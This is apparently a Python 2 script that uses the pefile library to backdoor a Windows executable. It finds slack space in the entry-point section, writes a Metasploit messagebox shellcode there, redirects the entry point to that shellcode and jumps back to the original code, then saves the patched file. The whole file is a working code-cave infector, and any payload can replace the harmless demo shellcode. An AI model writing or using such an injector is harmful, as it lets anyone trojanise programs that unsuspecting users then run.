from pefile import PE
from struct import pack
# windows/messagebox - 265 bytes
# http://www.metasploit.com
# ICON=NO, TITLE=W00t!, EXITFUNC=process, VERBOSE=false, 
# TEXT=Debasish Wnas Here!

sample_shell_code = ( 
"\xE9\x96\x00\x00\x00\xE8\xE8\x00\x00\x00\x75\x73\x65\x72\x33\x32" +
"\x2E\x64\x6C\x6C\x00\xE8\xFA\x00\x00\x00\x54\x68\x69\x73\x20\x69" +
"\x73\x20\x66\x75\x6E\x21\x00\xE8\xE1\x00\x00\x00\x30\x78\x64\x65" +
"\x61\x64\x62\x65\x65\x66\x00\x49\x89\xCD\x67\x41\x8B\x45\x3C\x67" +
"\x45\x8B\xB4\x05\x88\x00\x00\x00\x45\x01\xEE\x67\x45\x8B\x56\x18" +
"\x67\x41\x8B\x5E\x20\x44\x01\xEB\x67\xE3\x3F\x41\xFF\xCA\x67\x42" +
"\x8B\x34\x93\x44\x01\xEE\x31\xFF\x31\xC0\xFC\xAC\x84\xC0\x74\x07" +
"\xC1\xCF\x0D\x01\xC7\xEB\xF4\x39\xD7\x75\xDD\x67\x41\x8B\x5E\x24" +
"\x44\x01\xEB\x31\xC9\x66\x67\x42\x8B\x0C\x53\x67\x41\x8B\x5E\x1C" +
"\x44\x01\xEB\x67\x8B\x04\x8B\x44\x01\xE8\xC3\x41\x50\x41\x51\x41" +
"\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x50\x51\x52\x53\x54" +
"\x55\x56\x57\x48\x83\xEC\x28\x48\x83\xE4\xF0\x65\x4C\x8B\x24\x25" +
"\x60\x00\x00\x00\x4D\x8B\x64\x24\x18\x4D\x8B\x64\x24\x20\x4D\x8B" +
"\x24\x24\x4D\x8B\x7C\x24\x20\x4D\x8B\x24\x24\x4D\x8B\x64\x24\x20" +
"\xBA\x8E\x4E\x0E\xEC\x4C\x89\xE1\xE8\x4A\xFF\xFF\xFF\xE9\x13\xFF" +
"\xFF\xFF\x59\xFF\xD0\xBA\xA8\xA2\x4D\xBC\x48\x89\xC1\xE8\x35\xFF" +
"\xFF\xFF\x48\x89\xC3\x4D\x31\xC9\xE9\x1A\xFF\xFF\xFF\x41\x58\xE9" +
"\x01\xFF\xFF\xFF\x5A\x48\x31\xC9\xFF\xD3\x48\x83\xC4\x28\x5F\x5E" +
"\x5D\x5C\x5B\x5A\x59\x58\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x41\x5B" +
"\x41\x5A\x41\x59\x41\x58"
)

if __name__ == '__main__':
	exe_file = raw_input('[*] Enter full path of the main executable :')
	final_pe_file = raw_input('[*] Enter full path of the output executable :')
        #exe_file = '1.exe'
        #final_pe_file = '2.exe'
	pe = PE(exe_file)
	OEP = pe.OPTIONAL_HEADER.AddressOfEntryPoint
	pe_sections = pe.get_section_by_rva(pe.OPTIONAL_HEADER.AddressOfEntryPoint)
	align = pe.OPTIONAL_HEADER.SectionAlignment
	what_left = (pe_sections.VirtualAddress + pe_sections.Misc_VirtualSize) - pe.OPTIONAL_HEADER.AddressOfEntryPoint
	end_rva = pe.OPTIONAL_HEADER.AddressOfEntryPoint + what_left
	padd = align - (end_rva % align)
	e_offset = pe.get_offset_from_rva(end_rva+padd) - 1
	scode_size = len(sample_shell_code)+5
	if padd < scode_size:
		# Enough space is not available for shellcode
		exit()
	# Code can be injected
	scode_end_off = e_offset
	scode_start_off = scode_end_off - scode_size
	pe.OPTIONAL_HEADER.AddressOfEntryPoint = pe.get_rva_from_offset(scode_start_off)
	raw_pe_data = pe.write()
	jmp_to = OEP - pe.get_rva_from_offset(scode_end_off)
#	sample_shell_code = '\x41\x50%s\x41\x58\xe9%s' % (sample_shell_code, pack('I', jmp_to & 0xffffffff))
#	sample_shell_code = '\x60%s\x61\xe9%s' % (sample_shell_code, pack('I', jmp_to & 0xffffffff))
	sample_shell_code = '%s\xe9%s' % (sample_shell_code, pack('I', jmp_to & 0xffffffff))
#	sample_shell_code = '\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x50\x51\x52\x53%s\x5b\x5a\x59\x58\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59\x41\x58\xe9%s' % (sample_shell_code, pack('I', jmp_to & 0xffffffff))
#        print "".join( '{:02x}'.format(ord(x)) for x in sample_shell_code )
	final_data = list(raw_pe_data)
	final_data[scode_start_off:scode_start_off+len(sample_shell_code)] = sample_shell_code
#	final_data = ''.join(final_data)
	final_data = bytearray(final_data)
	raw_pe_data = final_data
	pe.close()
	new_file = open(final_pe_file, 'wb')
	new_file.write(raw_pe_data)
	new_file.close()
	print '[*] Job Done! :)'
